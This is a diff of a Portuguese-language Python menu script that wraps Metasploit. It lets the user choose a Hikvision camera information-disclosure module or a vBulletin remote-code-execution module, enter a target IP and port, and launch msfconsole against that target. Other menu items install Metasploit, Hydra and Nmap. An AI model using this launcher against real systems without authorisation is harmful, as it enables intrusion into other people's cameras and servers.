@@ -1,122 +1,178 @@
 import os
 import sys
+import webbrowser
 
-input("ATENÇÃO: Não use para fins maliciosos. Eu, como autor, não me responsabilizo. Pressione Enter para continuar.")
-os.system("clear")
+def exibir_aviso():
+    input("ATENÇÃO: Não use para fins maliciosos. Eu, como autor, não me responsabilizo. Pressione Enter para continuar.")
+    os.system("clear")
 
-print("Feito por Kamy")
-print('para sair precione ctrl + c')
-
-def comandos(opcao):
-    if opcao == '1': 
-        print("Exploits disponíveis: 1-camera, 2-windows")
-        exp = input("Escolha um exploit: ")
-        if exp == '1':
-            exp = 'auxiliary/gather/hikvision_info_disclosure_cve_2017_7921'
-        elif exp == '2':
-            exp = 'multi/http/vbulletin_widget_template_rce'
-        else:
-            input('valor invalido, pressione Enter...')
-            menu()    
-        os.system("clear")
-        print(f"{exp} - Exploit selecionado")
-        Rh = input("IP do alvo: ")
-        print(f"Alvo: {Rh}")
-        p = input("Porta a ser atacada: ")
-        print(f"Porta: {p}")
-        S = input("Seu IP (se necessário, dependendo do exploit): ")
-        s = input("Sua porta: ")
-        
-        g = input("Continuar? (S/N): ").strip().lower()
-        if g == 's':
-            # Construção do comando msfconsole 
-            comando = f"msfconsole -q -x 'use {exp}; set RHOSTS {Rh}; set RPORT {p};"
-            if S:
-                comando += f" set LHOST {S};"
-            if s:
-                comando += f" set LPORT {s};"
-            comando += " exploit -j; exit'"
-            print("Iniciando o Metasploit...")
-            os.system(comando)
-        elif g == 'n':
-            print("Desfazendo alterações...")
-            input("Pressione Enter para voltar ao menu...")
-            os.system("clear")
-        else:
-            print("Opção inválida. Retornando ao menu.")
-    elif opcao == '2':
-        def cmd(op):
-          os.system('clear')
-        print("""
-              s ~~~~~~~~~~~~~~~~~~
-              |====_kamydk++=================|
-              |1-update                      |
-              |2-upgrade                      |  
-              |3-atualizacao absoluta          |
-              |4-metasploit                    |
-              |5-hydra                        |
-              |6-nmap                        /
-              |99-voltar para o menu       _/
-              |_ _ _ _ _ _ _ _ _ _ _ _ _ _|
-              """)
-        op = input('_kamy-toolsdk-->')
-        cmd()
-        if op == '1':
-            os.system('sudo apt update')
-            cmd()
-        elif op == '2':
-            os.system('sudo apt upgrade')    
-            cmd()
-        elif op == '3':
-            os.system('sudo apt update -y && sudo apt upgrade')  
-            cmd()
-        elif op == '4':
-            os.system('sudo apt install metasploit-framework')     
-            menu() 
-        elif op == '5':
-            os.system('sudo apt install hydra')
-            cmd()
-        elif op == '6':
-            os.system('sudo apt install nmap')
-            cmd()
-        elif op == '99':
-            menu()
-        else:
-            cmd()
-    elif opcao == '3':
-        print("Selecione os números para executar as ferramentas.")
-        c = input("Continuar? (S/N): ").strip().lower()
-        if c == 's':
-            menu()
-        elif c == 'n':
-            print("Obrigado por usar a ferramenta!")
-            sys.exit()
-        else:
-            print("Opção inválida.")
-    elif opcao == '4':
-        print("Obrigado por usar a ferramenta!")
-        sys.exit()
+def msfconsole_simples():
+    print("Exploits disponíveis: 1-camera, 2-windows")
+    exp = input("Escolha um exploit: ").strip()
+    if exp == '1':
+        exploit = 'auxiliary/gather/hikvision_info_disclosure_cve_2017_7921'
+    elif exp == '2':
+        exploit = 'multi/http/vbulletin_widget_template_rce'
     else:
-        print("Opção inválida. Tente novamente.")
+        input("Valor inválido, pressione Enter para voltar ao menu...")
+        return
+
+    os.system("clear")
+    print(f"Exploit selecionado: {exploit}")
+    alvo = input("IP do alvo: ").strip()
+    porta = input("Porta a ser atacada: ").strip()
+    lhost = input("Seu IP (se necessário): ").strip()
+    lport = input("Sua porta: ").strip()
+
+    confirmar = input("Continuar? (S/N): ").strip().lower()
+    if confirmar == 's':
+        comando = f"msfconsole -q -x 'use {exploit}; set RHOSTS {alvo}; set RPORT {porta};"
+        if lhost:
+            comando += f" set LHOST {lhost};"
+        if lport:
+            comando += f" set LPORT {lport};"
+        comando += " exploit'"
+
+        print("Iniciando o Metasploit...")
+        os.system(comando)
+    else:
+        print("Cancelado pelo usuário. Retornando ao menu...")
+        input("Pressione Enter para continuar.")
+
+def instalar_ferramentas():
+    while True:
+        print("""\
+        =============================
+          INSTALAÇÃO DE FERRAMENTAS
+        =============================
+        1 - Atualizar pacotes
+        2 - Atualizar sistema
+        3 - Atualização completa
+        4 - Instalar Metasploit
+        5 - Instalar Hydra
+        6 - Instalar Nmap
+        99 - Voltar ao menu
+        =============================
+        """)
+        opcao = input("_kamy-toolsdk--> ").strip()
+
+        if opcao == '1':
+            os.system('sudo apt update')
+        elif opcao == '2':
+            os.system('sudo apt upgrade -y')
+        elif opcao == '3':
+            os.system('sudo apt update -y && sudo apt upgrade -y')
+        elif opcao == '4':
+            os.system('sudo apt install -y metasploit-framework')
+        elif opcao == '5':
+            os.system('sudo apt install -y hydra')
+        elif opcao == '6':
+            os.system('sudo apt install -y nmap')
+        elif opcao == '99':
+            break
+        else:
+            print("Opção inválida. Tente novamente.")
+
+def ajuda():
+    print("""\
+    ============================
+              AJUDA
+    ============================
+    1. msfconsole-simples: Configura exploits no Metasploit.
+    2. Instalar ferramentas: Instala pacotes essenciais.
+    3. Ajuda: Exibe este menu.
+    4. Sair: Encerra o programa.
+    ============================
+    """)
+    input("Pressione Enter para voltar ao menu principal.")
+
+def opcoes_avancadas():
+    while True:
+        print("""\
+        =======================
+             OPÇÕES AVANÇADAS
+        =======================
+        1 - Ver seu IP
+        2 - Apoiar o criador (recomendado)
+        3 - Teste de conexão
+        99 - Sair para o menu principal
+        =======================
+        """)
+        escolha = input("kamydK-o--> ").strip()
+
+        if escolha == '1':
+            os.system("ifconfig")
+            input("Pressione Enter para continuar.")
+        elif escolha == '2':
+            apoiar_criador()
+        elif escolha == '3':
+            os.system('ping google.com')
+            input("Pressione Enter para continuar.")
+        elif escolha == '99':
+            break
+        else:
+            print("Opção inválida. Tente novamente.")
+
+def apoiar_criador():
+    opcoes = {
+        "1": "https://www.instagram.com/kamy_z7/",
+        "2": "https://www.youtube.com/@Kamy_z7/",
+        "3": "https://github.com/null070/"
+    }
+    while True:
+        print("""\
+        ===================
+          APOIAR O CRIADOR
+        ===================
+        1 - Instagram
+        2 - YouTube
+        3 - GitHub
+        99 - Voltar
+        ===================
+        """)
+        escolha = input("kamydK-o-suporte--> ").strip()
+
+        if escolha in opcoes:
+            webbrowser.open(opcoes[escolha])
+        elif escolha == '99':
+            break
+        else:
+            print("Opção inválida. Tente novamente.")
 
 def menu():
-    print("""
-        ==============================
-           |/\/\/\/\/\/\/\/\/\|
-               FERRAMENTAS   
-        ==============================
-         1 - msfconsole-simples
-         2 - instalar ferramentas
-         3 - ajuda
-         4 - Sair
-        ==============================
-        -o para mais opcoes
-        ==============================
-     """)
-    opcao = input("_kamydK--> ")
-    comandos(opcao)
-
-if __name__ == "__main__":
     while True:
         os.system("clear")
-        menu()
+        print("Feito por Kamy")
+        print('v1.0.1')
+        print("Para sair, pressione Ctrl + C")
+        print("""\
+        ==============================
+        MENU DE FERRAMENTAS
+        ==============================
+        1 - msfconsole-simples
+        2 - Instalar ferramentas
+        3 - Ajuda
+        4 - Sair
+        ==============================
+        -o - Opções avançadas
+        ==============================
+        """)
+        opcao = input("_kamy-toolsdk--> ").strip()
+
+        if opcao == '1':
+            msfconsole_simples()
+        elif opcao == '2':
+            instalar_ferramentas()
+        elif opcao == '3':
+            ajuda()
+        elif opcao == '4':
+            print("Obrigado por usar a ferramenta!")
+            sys.exit()
+        elif opcao == '-o':
+            opcoes_avancadas()
+        else:
+            print("Opção inválida. Tente novamente.")
+
+if __name__ == "__main__":
+    exibir_aviso()
+    menu()
